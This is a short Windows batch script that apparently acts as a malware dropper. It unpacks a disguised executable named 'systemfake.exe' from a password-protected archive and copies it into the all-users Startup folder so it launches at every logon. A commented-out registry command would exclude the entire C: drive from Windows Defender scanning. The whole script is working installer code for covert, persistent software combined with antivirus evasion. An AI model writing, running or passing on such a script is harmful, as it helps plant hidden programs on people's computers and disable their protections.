@echo off
set lib="%CD%\lib"
set go="%ProgramData%\Microsoft\Windows\Start Menu\Programs\Startup"
cd %lib%

:: reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths" /v C:\ &:: FUCK DEFENDER
"C:\Program Files\WinRAR\unrar.exe" x -p1234 "%cd%\systemfake.rar" "%lib%"
xcopy /Y "%lib%\systemfake.exe" "%go%"
pause
timeout /t 5 >nul
